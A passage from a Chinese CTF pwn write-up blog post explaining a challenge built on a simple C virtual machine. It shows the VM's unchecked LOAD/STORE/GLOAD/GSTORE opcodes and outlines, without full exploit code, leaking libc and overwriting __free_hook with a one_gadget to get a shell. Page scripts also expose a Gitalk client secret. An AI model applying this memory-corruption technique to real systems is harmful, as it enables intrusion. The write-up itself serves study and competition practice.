class="number">0</span>, code+nread, <span class="keyword">sizeof</span>(code)-nread);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        nread += ret;</span><br><span class="line">    &#125;</span><br><span class="line">    VM *vm = vm_create(code, nread/<span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    vm_exec(vm, <span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    vm_free(vm);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行以下命令配置环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:parrt/simple-virtual-machine-C.git</span><br><span class="line">cp ./main.c /simple-virtual-machine-C-master/src/vmtest.c</span><br><span class="line"><span class="built_in">cd</span> simple-virtual-machine-C-master</span><br><span class="line">cmake .</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<h3 id="3-漏洞点-3">3. 漏洞点</h3>
+<p>首先，我们可以在 <a href="https://github.com/parrt/simple-virtual-machine-C/blob/master/src/vm.h#L40" target="_blank" rel="noopener">#L40</a> 看到 VM 结构体的布局：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> returnip;</span><br><span class="line">    <span class="keyword">int</span> locals[DEFAULT_NUM_LOCALS];</span><br><span class="line">&#125; Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> *code;</span><br><span class="line">    <span class="keyword">int</span> code_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// global variable space</span></span><br><span class="line">    <span class="keyword">int</span> *globals;</span><br><span class="line">    <span class="keyword">int</span> nglobals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Operand stack, grows upwards</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>[DEFAULT_STACK_SIZE];</span><br><span class="line">    Context call_stack[DEFAULT_CALL_STACK_SIZE];</span><br><span class="line">&#125; VM;</span><br></pre></td></tr></table></figure>
+<p>根据 main.c 的代码，可以得知创建出的 VM 结构体，其 <strong>code 字段指向栈</strong>，<strong>globals 字段指向堆</strong>。</p>
+<p>而在 opcode LOAD 和 STORE 的处理中，我们可以看到，这里可以 <strong>相对 VM 结构体（注意结构体在堆中）</strong> 偏移任意字节进行读写。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> LOAD: <span class="comment">// load local or arg</span></span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;call_stack[callsp].locals[offset];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">case</span> STORE:</span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;call_stack[callsp].locals[offset] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>同时，opcode GLOAD 和 GSTORE 可以让我们<strong>相对 globals 指针所指向的内存</strong>偏移任意字节进行读写。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> GLOAD: <span class="comment">// load from global memory</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;globals[addr];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GSTORE:</span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;globals[addr] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>这样，我们便可以利用这些 opcode 来泄露指针并任意读写内存，进而修改 libc 上的 free hook，在 VM 退出时劫持控制流。</p>
+<h3 id="4-利用流程-3">4. 利用流程</h3>
+<ul>
+<li>
+<p>使用 STORE，让 <code>VM-&gt;stack</code> 向低地址处移动，读取 globals 和 code 的指针值，<strong>并保存 vm-&gt;call_stack 上</strong>，之后恢复 <code>VM-&gt;stack</code>。</p>
+<blockquote>
+<p>恢复时需要覆写 globals 和 code 指针，注意需要覆写正确。</p>
+</blockquote>
+</li>
+<li>
+<p>使用任意地址读，读取栈上的 libc_start_main return address，计算出 libc base、free_hook 和 one_gadget addr。</p>
+</li>
+<li>
+<p>使用任意地址写，修改 free_hook 上的地址条目为 one_gadget，劫持控制流获取 shell。</p>
+</li>
+</ul>
+<blockquote>
+<p>这题利用较为简单，exp 鸽了。</p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/01/rwctf2022_qws/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/01/rwctf2022_flag/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            RWCTF2022 Pwn 笔记2 - FLAG Writeup
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/01/IMF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">《IMF：Inferred Model-based Fuzzer》论文笔记</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
